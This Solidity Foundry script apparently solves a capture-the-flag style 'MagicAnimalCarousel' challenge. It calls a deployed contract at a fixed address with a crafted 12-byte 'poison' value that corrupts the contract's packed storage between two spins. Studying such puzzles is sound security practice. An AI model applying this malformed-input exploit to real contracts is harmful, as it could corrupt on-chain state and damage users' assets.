// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselScript is Script {
    MagicAnimalCarousel public magicAnimalCarousel;

    function setUp() public {
        magicAnimalCarousel = MagicAnimalCarousel(0xE0201B2DA25DDd43236e23CBD22354F115EafAaB);
    }

    function run() public {
        vm.startBroadcast();

        bytes12 poison = 0x10000000000000000000FFFF;

        magicAnimalCarousel.setAnimalAndSpin("Dog");
        magicAnimalCarousel.changeAnimal(string(abi.encodePacked(poison)), 1);
        magicAnimalCarousel.setAnimalAndSpin("Parrot");

        vm.stopBroadcast();
    }
}
